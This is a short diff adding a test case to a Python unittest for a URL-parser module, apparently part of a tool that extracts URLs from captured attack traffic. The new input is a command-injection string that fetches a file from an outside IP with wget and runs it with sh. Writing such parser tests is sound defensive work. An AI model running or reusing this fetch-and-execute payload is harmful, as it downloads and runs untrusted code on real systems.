@@ -51,6 +51,10 @@ class Test_Reemitter(unittest.TestCase):
                         "http://test.alsothis.com/",
                         ]
                     ),
+                ("$(wget+http://176.32.33.123/GPON+-O+->+/tmp/w;sh+/tmp/w)",
+                    ["http://176.32.33.123/GPON",
+                        ]
+                    ),
                 ]
 
         mod = URLParserReemitterModule(0, None, None, None, None)
